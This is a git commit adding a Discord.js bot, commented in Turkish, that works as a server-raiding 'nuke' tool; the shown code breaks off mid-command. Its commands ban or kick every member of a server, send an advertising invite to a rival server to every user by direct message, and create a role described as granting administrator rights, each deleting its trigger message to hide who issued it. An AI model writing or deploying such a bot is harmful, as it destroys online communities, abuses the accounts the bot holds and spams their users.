e83a6ad5c8cc66198e754953f6f8fce89307c911
exoticexes <mertrobloxtr@gmail.com>
2025-08-16 23:32:39 +0300

    bot.js

---
+++ bot.js
@@ -0,0 +1,39 @@
+const Discord = require("discord.js");
+const client = new Discord.Client();
+const ayarlar = require("./ayarlar.json");
+const { Client, Util } = require("discord.js");
+const request = require("request");
+client.login(ayarlar.token);
+
+client.on("message", msg => {         
+  if (msg.content === "+ban") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.ban());  
+  }
+});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban
+
+client.on("message", msg => {
+  if (msg.content === "+kick") {
+    msg.delete();
+    msg.guild.members.forEach(member => member.kick());
+  }
+});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
+
+client.on("message", async msg => {
+  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
+    msg.delete();
+    await msg.client.users
+      .forEach(users =>
+        users.send(
+          "**SUNUCU GG BİZE GELİN https://discord.gg/e486WKzCxJ ** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+        )
+      )
+      .catch(console.error);
+  } 
+});
+
+client.on("message", msg => {
+  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
+    msg.delete();
+    msg.guild.createRole({
+      name: ".",
